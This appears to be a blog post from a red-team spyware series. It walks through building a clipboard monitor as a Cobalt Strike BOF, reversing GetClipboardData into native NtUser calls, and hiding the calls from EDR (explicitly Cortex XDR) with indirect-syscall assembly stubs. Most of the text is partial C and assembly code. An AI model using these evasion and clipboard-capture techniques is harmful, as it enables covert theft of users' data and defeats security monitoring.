---
title: "Clipboard monitoring with evasions"
date: 2024-08-30T13:43:53-06:00
draft: false
image: brand_image.jpg
tags: ["BOF","spyware", "evasions", "cobaltstrike"]
series: "SpyBOF implem"
---
## Basic code
```c
void main() {

    HWND owner = GetConsoleWindow(); 
    OpenClipboard(owner);
    owner = GetClipboardData(CF_TEXT);
    printf("Clipboard: %s\n", (char *)owner);
    CloseClipboard();
 }
```
In our basic code, we're using 4 functions that we would like to evade. These are `GetConsoleWindow()`, `OpenClipboard()`, `GetClipboardData()` and `CloseClipboard`. Therefore, we need to understand what are the basic functions from the kernel these functions called.

OpenClipboard --> NtUserOpenClipboard
GetClipboardData --> NtUserGetClipboardData
CloseClipboard --> NtUserCloseClipboard

GetConsoleWindow() More complex but
--> ntdll.ZwDeviceIoContolFile
(ghidra doesn't help on it)
--> Too complex for nothing. Even in the worst case, there is no interest for an AV/EDR to hook this function. It cannot be really suspicious on it own. We can even cross check with [malapi.io](https://malapi.io/)
## Diving into GetClipboardData
Indeed, `GetClipboardData` can be seen as malicious and flagged thanks to [Cortex XDR](https://docs-cortex.paloaltonetworks.com/r/Cortex-XDR/Cortex-XDR-Analytics-Alert-Reference-by-Alert-name/Uncommon-GetClipboardData-API-function-invocation-of-a-possible-information-stealer) for instance. Therefore, it really matters to implement and make it in indirect syscalls. However, it's more complex than it seems. Indeed, it's not like `OpenClipboard` or `CloseClipboard` that makes a direct reference to their native functions. Here if we want to know how `GetClipboardData` is built, we can look at the [documentation of reactOS](https://doxygen.reactos.org/d3/de7/win32ss_2user_2user32_2windows_2clipboard_8c.html#a291ce17e89edb462bd1c769ba9c18e54)(an open-source version of Windows). We cannot be sure that it's exactly the same but if we want to check, we can reverse the function thanks to Ghidra.

Before all, or before syscalls, we have to check how the NtAPI of the corresponding function works. In a first time, we'll only define a pointer to our function. 

```c
typedef HANDLE(NTAPI* NtUserGetClipboardData)(
    UINT fmt,
    PGETCLIPBDATA pgcd 
);

// In main
HMODULE hNTDLL = LoadLibrary("win32u.dll");
NtUserGetClipboardData mineNtUserGetClipboardData = (NtUserGetClipboardData)GetProcAddress(hNTDLL, "NtUserGetClipboardData");
```
We have now our "proper version" of `NtUserGetClipboardData` that we can use directly. However, if we try to convert the return value directly into a char*, it won't work because we have few other conditions to check. Indeed, it will depend if we have a global handle and the content of what it's in the clipboard. 

### GlobalHandle case

#### What's a global handle?
A **handle** is an abstract reference or identifier used by the operating system to manage resources and objects. These resources can can be windows, files, memory blocks, devices, etc. This allows different apps to interact with different resources without needing to know the internal details of how the resource is implemented. There are different types of handle:
- **HINSTANCE**: Handle to an instance of a module (application or DLL).
- **HANDLE**: A generic handle for various objects, such as files, events, and processes.
- **HGLOBAL**: Handle to a global memory block.

 Now, if we look at the documentation of **GlobalLock**, we can see that it "Locks a global memory object and returns a pointer to the first byte of the object's memory block.". In other terms, it will ensure that the memory block associated with the object is still accessible and won't be moved or deleted by Windows.

Here, if we look at our condition, we can assume that we'll need to use a Global Handle to get the memory from hData. Therefore, `NtUserCreateLocalMemHandle` will be used to obtain the size of the memory block associated to hData. `GlobalAlloc` allows to allocate a global memory block  of block size cbData. Etc.
#### Implem of GetClipboardData

```c
...
hData = NtUserGetClipboardData(uFormat, &gcd);
if (!hData)
	return NULL;

switch (uFormat)
{
	case CF_DSPMETAFILEPICT:
	case CF_METAFILEPICT:
		return GdiCreateLocalMetaFilePict(hData);
	case CF_DSPENHMETAFILE:
	case CF_ENHMETAFILE:
		return GdiCreateLocalEnhMetaFile(hData);
}

if (gcd.fGlobalHandle)
{
	HANDLE hGlobal;

	NtUserCreateLocalMemHandle(hData, NULL, 0, &cbData);
	hGlobal = GlobalAlloc(GMEM_DDESHARE | GMEM_MOVEABLE, cbData);
	pData = GlobalLock(hGlobal);
	NtUserCreateLocalMemHandle(hData, pData, cbData, NULL);
	hData = hGlobal;
}
...
```
In this case, we can see that we'll have to use another function from the native windows library which is `NtUserCreateLocalMemHandle`. We can then a pointer to this function in order to use it like we did for `NtUserGetClipboardData`. 

Also, we can see that we have a second parameter `NtUserGetClipboardData` unlike his "parent". Once more, we bet on the reliability of reactOS and checks[ how the structure `GETCLIPBDATA` is defined.](https://doxygen.reactos.org/dd/d79/include_2ntuser_8h_source.html#l01155)
```c
typedef struct tagGETCLIPBDATA
{
    UINT uFmtRet;
    BOOL fGlobalHandle;
    union
    {
        HANDLE hLocale;
        HANDLE hPalette;
    };
} GETCLIPBDATA, *PGETCLIPBDATA;
```

Now, we can try to simplify the code and ignore what we don't care about. Here, we don't care about non-text formats. GlobalHandle case gets simpler form and we can limit ourselves to this
```c
hData = NtUserGetClipboardData(uFormat, &gcd);
// We don't care about what was here
if (gcd.fGlobalHandle)
{
	HANDLE hGlobal;

	NtUserCreateLocalMemHandle(hData, NULL, 0, &cbData);
	hGlobal = GlobalAlloc(GMEM_DDESHARE | GMEM_MOVEABLE, cbData);
	pData = GlobalLock(hGlobal);
	NtUserCreateLocalMemHandle(hData, pData, cbData, NULL);
	hData = hGlobal;
}
...
```

Considering all what we said, we can have our own version of this case. Adding components for debugging is necessary.
```c
UINT uFormat = CF_TEXT;
    GETCLIPBDATA gcd = { 0 };
    HANDLE hNtData = mineNtUserGetClipboardData(uFormat, &gcd);
    if (hNtData == NULL) {
        printf("Failed to get clipboard data using NtUserGetClipboardData. error: 0x%lx\n", GetLastError());
        CloseClipboard();
        FreeLibrary(hNTDLL);
        return;
    }

    HANDLE hGlobal = NULL;
    if (gcd.fGlobalHandle) {
        DWORD cbData = 0;

        // First call to determine the required size
        if (mineNtUserCreateLocalMemHandle(hNtData, NULL, 0, &cbData) == FALSE) {
            printf("Failed to get the required size for the global handle. error: 0x%lx\n", GetLastError());
        } else {
            // Allocate global memory with the obtained size
            hGlobal = GlobalAlloc(GMEM_DDESHARE | GMEM_MOVEABLE, cbData);
            if (hGlobal == NULL) {
                printf("Failed to allocate global memory. error: 0x%lx\n", GetLastError());
            } else {
                PVOID pData = GlobalLock(hGlobal);
                if (pData == NULL) {
                    printf("Failed to lock global handle. error: 0x%lx\n", GetLastError());
                } else {
                    mineNtUserCreateLocalMemHandle(hNtData, pData, cbData, NULL);
                    printf("Clipboard data (Global Handle): %s\n", (char*)pData); // Okay, it works here!             
                    GlobalUnlock(hGlobal);
                }
            }
        }
```
### Classic text format (gcd.uFmtRet == 1 == CF_TEXT)
It's pure classic text
### Unicode text format (gcd.uFmtRet == 13 == CF_UNICODETEXT)
This case is a little more complex and needs to implement a function that is called `IntSynthesizeMultiByte` [in ReactOS](https://doxygen.reactos.org/d3/de7/win32ss_2user_2user32_2windows_2clipboard_8c.html#afd4242728a3e715c58b23cff31914cc9) but that doesn't seem to exist in Windows. This assumption is made because this symbol cannot be found when reversing and executable with x64dbg. Hopefully for us!! All functions from this function calls only functions from the standard API!
We can therefore make calls to them. Here is the equivalent of `IntSynthesizeMultiByte` and is called `ConvertUnicodeToMultiByte`.
```c
HANDLE ConvertUnicodeToMultiByte(BOOL bOem, LPCWSTR pwStr, INT cbStr) {
	HANDLE hGlobal;
	PVOID pGlobal;
	INT cbGlobal;
	
	cbGlobal = WideCharToMultiByte(bOem ? CP_OEMCP : CP_ACP,
								   0, pwStr, cbStr / sizeof(WCHAR),
								   NULL, 0, NULL, NULL);
	hGlobal = GlobalAlloc(GMEM_DDESHARE | GMEM_MOVEABLE, cbGlobal);
	if (!hGlobal)
		return NULL;
	
	pGlobal = GlobalLock(hGlobal);
	WideCharToMultiByte(bOem ? CP_OEMCP : CP_ACP,
						0, pwStr, cbStr / sizeof(WCHAR),
						pGlobal, cbGlobal, NULL, NULL);
	GlobalUnlock(hGlobal);
	
	return hGlobal;
}
```

##### NOTE
Compile with
```sh
gcc main.c -o main
```
Not -c flag

## Let's move to Hell's gate - Indirect syscalls
If you read the doc about the keylogger, this part wouldn't be a big deal. However, in our case, we have to make a slight change. We also want to put the syscall number and the address of the syscall in the native library on the stak. Therefore, if we make a remind about the [x64 calling convention](https://learn.microsoft.com/en-us/cpp/build/x64-calling-convention?view=msvc-170), we can read that "The fifth and higher arguments are passed on the stack." The fourth one are in the registers `rcx`, `rdx`, `r8` and `r9`. 
```
1 RCX 0X0
2 RDX 0X8
3 R8 0X10
4 R9 0X18
5 stack (rsp) + 0x28
```
Then, from the native function `NtUserCreateLocalMemHandle` since the registers are already used, we need to retrieve the value on the stack to load into eax and jump to the syscall address. The fifth argument is at sp + 0x28. Sixth at sp + 0x30. 

This makes sense because of 64-bit architecture: 1 byte of addressing represents 1 byte of instructions.
0x30 - 0x28 = 8. 8 bytes --> 8 bytes * 8bits = 64 bits (x64 arch)
```c
__asm__("\n\
.global myNtUserOpenClipboard \n\
.global myNtUserGetClipboardData \n\
.global myNtUserCreateLocalMemHandle \n\
.global myNtUserCloseClipboard \n\
");

...

__asm__("myNtUserCreateLocalMemHandle: \n\
mov r10, rcx \n\
mov eax, [rsp + 0x28] \n\
jmp [rsp + 0x30] \n\
ret \n\
");
```

r8d and not r8 because of DWORD https://learn.microsoft.com/en-us/windows-hardware/drivers/debugger/x64-architecture for other functions

**References**
God thanks [this paper](https://www.researchgate.net/publication/251702413_Extracting_the_windows_clipboard_from_physical_memory/fulltext/03ac52b40cf22d2e66d8d013/Extracting-the-windows-clipboard-from-physical-memory.pdf) to understand different cases of GetClipboardData.
